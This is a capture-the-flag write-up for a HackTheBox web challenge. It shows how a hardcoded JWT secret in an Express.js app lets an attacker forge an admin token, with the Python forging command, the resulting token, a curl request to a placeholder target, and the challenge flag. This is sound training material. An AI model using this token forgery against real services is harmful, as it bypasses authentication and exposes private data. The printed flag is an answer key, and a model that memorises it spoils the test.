---
title: "WayWitch"
ctf: "HackTheBox"
date: 2026-05-26
category: web
difficulty: very-easy
flag_format: "HTB{...}"
---

# WayWitch

## Summary

Express.js app with hardcoded JWT signing secret in the server-side source code. Forging an admin JWT grants access to the `/tickets` endpoint which returns all support tickets including the Admin's ticket containing the flag.

## Solution

### Step 1: Source Code Analysis

Examined `util.js` which revealed the JWT secret:

```javascript
const secret = "halloween-secret";
```

The `/tickets` endpoint checks `username === "admin"` and returns all tickets including the flag.

### Step 2: Forge Admin JWT

```bash
python3 -c "import jwt; print(jwt.encode({'username':'admin'},'halloween-secret',algorithm='HS256'))"
```

Output:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.cZWxa1K7QYrrER18LTTA6BFtEt79_e_zcK4TIVdFNH8
```

### Step 3: Extract Flag

```bash
curl -sk -b "session_token=<forged_jwt>" https://target:port/tickets
```

The Admin ticket (id: 3) contained the flag in its `content` field.

## Flag

```
HTB{k33p_th3s3_jwt_s3cr3t_s4f3f_br0}
```
